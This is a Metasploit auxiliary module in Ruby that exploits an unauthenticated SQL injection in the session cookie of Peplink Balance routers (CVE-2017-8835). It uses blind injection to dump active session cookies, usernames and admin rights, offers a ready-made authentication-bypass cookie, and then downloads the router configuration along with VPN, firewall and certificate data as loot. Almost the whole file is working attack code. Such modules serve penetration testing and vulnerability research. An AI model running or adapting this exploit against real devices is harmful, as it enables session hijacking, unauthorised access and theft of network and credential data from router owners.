class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Peplink Balance routers SQLi',
        'Description' => %q{
          Firmware versions up to 7.0.0-build1904 of Peplink Balance routers are affected by an unauthenticated
          SQL injection vulnerability in the bauth cookie, successful exploitation of the vulnerability allows an
          attacker to retrieve the cookies of authenticated users, bypassing the web portal authentication.

          By default, a session expires 4 hours after login (the setting can be changed by the admin), for this
          reason, the module attempts to retrieve the most recently created sessions.
        },
        'Author' => [
          'X41 D-Sec GmbH <info@x41-dsec.de>', # Original Advisory
          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' => [
          [ 'EDB', '42130' ],
          [ 'CVE', '2017-8835' ],
          [ 'URL', 'https://gist.github.com/red0xff/c4511d2f427efcb8b018534704e9607a' ]
        ],
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptBool.new('BypassLogin', [true, 'Just bypass login without trying to leak the cookies of active sessions', false]),
        OptBool.new('EnumUsernames', [true, 'Retrieve the username associated with each session', false]),
        OptBool.new('EnumPrivs', [true, 'Retrieve the privilege associated with each session', false]),
        OptInt.new('LimitTries', [false, 'The max number of sessions to try (from most recent), set to avoid checking expired ones needlessly', nil]),
        OptBool.new('AdminOnly', [true, 'Only attempt to retrieve cookies of privilegied users (admins)', false])
      ]
    )
  end

  def perform_sqli
    # NOTE: using run_sql because there is a limit on the length of our queries
    # will work only if we remove the casts, NULL value handling etc.
    digit_range = ('0'..'9')
    bit_range = ('0'..'1')
    alphanumeric_range = ('0'..'z')
    session_count = @sqli.run_sql("select count(1) from sessionsvariables where name='expire'").to_i
    print_status "There are #{session_count} (possibly expired) sessions"

    # limit the number of session cookies to retrieve if the option is set
    session_count = datastore['LimitTries'] if datastore['LimitTries'] && datastore['LimitTries'] < session_count

    session_ids = session_count.times.map do |i|
      id = @sqli.run_sql('select id from sessionsvariables ' \
                    "where name='expire' order by " \
                    "cast(value as int) desc limit 1 offset #{i}", output_charset: digit_range).to_i
      # if AdminOnly, check if is an admin
      if datastore['AdminOnly']
        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
        is_rwa > 0 ? id : nil
      else
        id
      end
    end.compact

    print_status("After filtering out non-admin sessions: #{session_ids.count} sessions remain") if datastore['AdminOnly']

    if session_ids.count == 0
      print_error('No active authenticated sessions found, try again after a user has authenticated')
      return
    end

    print_status('Trying the ids from the most recent logins')

    cookies = [ ]

    session_ids.each_with_index do |id, idx|
      cookie = @sqli.run_sql("select sessionid from sessions where id=#{id}", output_charset: alphanumeric_range)
      cookies << cookie
      if datastore['EnumUsernames']
        username = @sqli.run_sql("select value from sessionsvariables where name='username' and id=#{id}")
      end

      if datastore['EnumPrivs']
        is_rwa = @sqli.run_sql("select count(1)>0 from sessionsvariables where id=#{id} and name='rwa' and value='1'", output_charset: bit_range).to_i
      end
      username_msg = username ? ", username = #{username}" : ''
      is_admin_msg = if is_rwa
                       ", with #{is_rwa > 0 ? 'read/write' : 'read-only'} permissions"
                     else
                       ''
                     end
      print_good "Found cookie #{cookie}#{username_msg}#{is_admin_msg}"
      break if session_count == idx + 1
    end
    cookies
  end

  # returns false if data has an error message, the data otherwise
  def parse_and_check_for_errors(data)
    xml = ::Nokogiri::XML(data)
    if xml.errors.empty? && data.include?('errorMessage')
      print_error xml.css('errorMessage')[0].text
      false
    else
      xml.errors.empty? ? xml : data
    end
  end

  def get_data_by_option(cookie, option)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'data.cgi'),
      'method' => 'GET',
      'cookie' => "bauth=#{cookie}",
      'vars_get' => {
        'option' => option
      }
    })
    return '' if option == 'noop' && res.code == 200 && parse_and_check_for_errors(res.body)

    if res.code == 200
      print_status "Retrieving #{option}"
      xml = parse_and_check_for_errors(res.body)
      if xml
        print_xml_data(xml)
        path = store_loot("peplink #{option}", 'text/xml', datastore['RHOST'], res.body)
        print_good "Saved at #{path}"
        xml
      else
        false
      end
    else
      print_error "Could not retrieve #{option}"
      false
    end
  end

  def retrieve_data(cookie)
    data_options = %w[fhlicense_info sysinfo macinfo hostnameinfo uptime client_info hubport fhstroute ipsec wan_summary firewall cert_info mvpn_summary]
    # in case of a VPN being configured, the option cert_pem_details can leak private keys? (option=cert_pem_details&pem=)
    # might be interesting: eqos_priority, for QoS
    # first, attempt downloading the router configuration
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'download_config.cgi'),
      'method' => 'GET',
      'cookie' => "bauth=#{cookie}"
    })
    if res.code == 200
      # router configuration consists of a 24-byte header, and .tar.gz compressed data
      config = res.body
      if parse_and_check_for_errors(config)
        path = store_loot('peplink configuration tar gz', 'application/binary', datastore['RHOST'], config)
        print_good "Retrieved config, saved at #{path}"
      end
    else
      print_error 'Could not retrieve the router configuration file'
    end

    data_options.each do |option|
      get_data_by_option(cookie, option)
    end
  end

  def print_xml_data(xml)
    nodes = [ [xml, 0] ]
    until nodes.empty?
      node, nesting = nodes.pop
      if node.is_a?(Nokogiri::XML::Document)
        node.children.each do |child|
          nodes.push([child, nesting + 1])
        end
      elsif node.is_a?(Nokogiri::XML::Element)
        node_name = node.name
        if node.attributes && !node.attributes.empty?
          node_name += " {#{node.attributes.map { |(_n, attr)| "#{attr.name}=#{attr.value}" }.join(',')}}"
        end
        vprint_good "\t" * nesting + node_name
        node.children.each do |child|
          nodes.push([child, nesting + 1])
        end
      elsif node.is_a?(Nokogiri::XML::Text)
        vprint_good "\t" * nesting + node.content
      end
    end
  end

  def check
    @sqli = create_sqli(dbms: SQLitei::BooleanBasedBlind) do |payload|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'MANGA', 'admin.cgi'),
        'method' => 'GET',
        'cookie' => "bauth=' or #{payload}--"
      })
      return Exploit::CheckCode::Unknown("Unable to connect to #{target_uri.path}") unless res

      res.get_cookies.empty? # no Set-Cookie header means the session cookie is valid
    end
    if @sqli.test_vulnerable
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    unless check == Exploit::CheckCode::Vulnerable
      print_error 'Target does not seem to be vulnerable'
      return
    end
    print_good 'Target seems to be vulnerable'
    if datastore['BypassLogin']
      cookies = [
        "' or id IN (select s.id from sessions as s " \
              "left join sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')--"
      ]
    else
      cookies = perform_sqli
    end
    admin_cookie = cookies.detect do |c|
      print_status "Checking for admin cookie : #{c}"
      get_data_by_option(c, 'noop')
    end
    if admin_cookie.nil?
      print_error 'No valid admin cookie'
      return
    end
    retrieve_data(admin_cookie)
  end
end
